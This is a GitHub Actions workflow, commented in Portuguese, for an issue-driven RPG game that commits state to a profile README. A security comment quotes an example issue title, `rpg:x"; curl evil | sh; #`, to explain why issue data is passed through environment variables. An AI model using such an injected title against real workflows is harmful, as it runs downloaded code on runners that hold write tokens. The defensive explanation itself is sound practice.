name: ⚔️ Aethoria RPG Engine v3

on:
  issues:
    types: [opened]
  issue_comment:
    types: [created]

# ─── Fila sequencial ──────────────────────────────────────────────────────────
# Grupo compartilhado com update-projects.yml: os dois workflows escrevem README.md
# e dão push na mesma branch. Sem grupo comum, um rejeita o push do outro.
concurrency:
  group: readme-writer
  cancel-in-progress: false

permissions:
  contents: write
  issues: write

jobs:
  process_action:
    # Só processa issues com prefixo rpg: ou comentários com /atacar em issues [RAID], ignora bots
    if: |
      (github.event_name == 'issues' && startsWith(github.event.issue.title, 'rpg:') && !contains(github.event.issue.user.login, '[bot]')) ||
      (github.event_name == 'issue_comment' && startsWith(github.event.issue.title, '[RAID]') && startsWith(github.event.comment.body, '/atacar') && !contains(github.event.comment.user.login, '[bot]'))
    runs-on: ubuntu-latest
    timeout-minutes: 5

    steps:
      - name: 📥 Checkout
        uses: actions/checkout@v4
        with:
          token: ${{ secrets.GITHUB_TOKEN }}
          # depth 1 basta: o engine só lê o estado do working tree, não o histórico.
          fetch-depth: 1

      - name: 🔄 Configurar Git e Atualizar
        run: |
          git config user.name  "Aethoria Bot ⚔️"
          git config user.email "aethoria-bot@users.noreply.github.com"
          git pull --rebase origin main

      # NOTA: nada de actions/setup-python aqui. O projeto é stdlib-only (zero
      # dependências) e o ubuntu-latest já traz python3. `cache: pip` sem
      # requirements.txt/pyproject.toml faz o próprio step do setup-python falhar.

      # SEGURANÇA: dado controlado pelo autor da issue (título, login) NUNCA entra num
      # bloco `run:` via ${{ }} — isso é substituição textual antes do shell existir, e
      # um título como `rpg:x"; curl evil | sh; #` executaria código arbitrário num
      # runner com contents:write. Passa por env e é lido como "$VAR" entre aspas.
      - name: ⚔️ Processar ação RPG
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          EVENT_NAME: ${{ github.event_name }}
          ISSUE_TITLE: ${{ github.event.issue.title }}
          ISSUE_NUMBER: ${{ github.event.issue.number }}
          ISSUE_ACTOR: ${{ github.event.issue.user.login }}
          COMMENT_ACTOR: ${{ github.event.comment.user.login }}
        run: |
          if [ "$EVENT_NAME" = "issue_comment" ]; then
            python3 rpg/engine.py "rpg:raid_attack:$ISSUE_NUMBER" "$COMMENT_ACTOR"
          else
            python3 rpg/engine.py "$ISSUE_TITLE" "$ISSUE_ACTOR"
          fi

      - name: 💾 Commit resultado
        env:
          EVENT_NAME: ${{ github.event_name }}
          ISSUE_TITLE: ${{ github.event.issue.title }}
          ISSUE_ACTOR: ${{ github.event.issue.user.login }}
          COMMENT_ACTOR: ${{ github.event.comment.user.login }}
        run: |
          # `git add a b c` MORRE (exit 128) sem stage-ar NADA se um pathspec não
          # existir. raids.json só nasce na primeira raid, então listá-lo junto fazia
          # todo turno virar "sem mudanças" e nenhum estado era commitado. Um pathspec
          # por chamada, cada um opcional.
          for path in README.md rpg/state.json rpg/leaderboard.json rpg/players rpg/raids.json; do
            if [ -e "$path" ]; then
              git add -- "$path"
            fi
          done

          if git diff --staged --quiet; then
            echo "Nenhuma mudança para commitar."
            exit 0
          fi

          if [ "$EVENT_NAME" = "issue_comment" ]; then
            SUBJECT="⚔️ [@${COMMENT_ACTOR}] Raid Attack"
            BODY="Turno processado por Aethoria Engine v3"
          else
            SUBJECT="⚔️ [@${ISSUE_ACTOR}] ação de jogo"
            # Título vai no corpo como argumento (argv), nunca interpolado em comando.
            BODY="$ISSUE_TITLE"
          fi
          git commit -m "$SUBJECT" -m "$BODY"

          # Retry: o cron do update-projects pode ter dado push entre o pull e agora.
          for attempt in 1 2 3; do
            if git push; then
              echo "Push OK na tentativa $attempt."
              exit 0
            fi
            echo "Push rejeitado (tentativa $attempt), rebase e retry..."
            git pull --rebase origin main
            sleep 3
          done
          echo "::error::Push falhou após 3 tentativas."
          exit 1

      - name: 💬 Comentar e fechar Issue (apenas para ações normais)
        if: github.event_name == 'issues'
        uses: actions/github-script@v7
        with:
          script: |
            const login  = context.payload.issue.user.login;
            const action = context.payload.issue.title;
            const repo   = `${context.repo.owner}/${context.repo.repo}`;
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo:  context.repo.repo,
              issue_number: context.issue.number,
              body: [
                `⚔️ **Aethoria Engine v3** processou: \`${action}\``,
                ``,
                `@${login} — Confira o resultado no [README do perfil](https://github.com/${repo}#readme).`,
                ``,
                `> *"A profecia se move. Cada escolha importa."*`,
                ``,
                `---`,
                `> ℹ️ Esta issue foi gerada automaticamente pelo jogo. Pode ser fechada com segurança.`
              ].join('\n')
            });
            await github.rest.issues.update({
              owner: context.repo.owner,
              repo:  context.repo.repo,
              issue_number: context.issue.number,
              state:  'closed',
              labels: ['rpg-action']
            });

      # Se o engine estourou, o jogador merece saber — antes a falha era um ✗ mudo no
      # Actions e o turno simplesmente desaparecia.
      - name: ⚠️ Avisar falha na Issue
        if: failure() && github.event_name == 'issues'
        uses: actions/github-script@v7
        with:
          script: |
            const repo = `${context.repo.owner}/${context.repo.repo}`;
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo:  context.repo.repo,
              issue_number: context.issue.number,
              body: [
                `💥 **Aethoria Engine falhou ao processar esta ação.**`,
                ``,
                `O turno não foi salvo. Se o título estiver correto, é bug do jogo —`,
                `veja o [log da execução](https://github.com/${repo}/actions/runs/${context.runId}).`
              ].join('\n')
            });
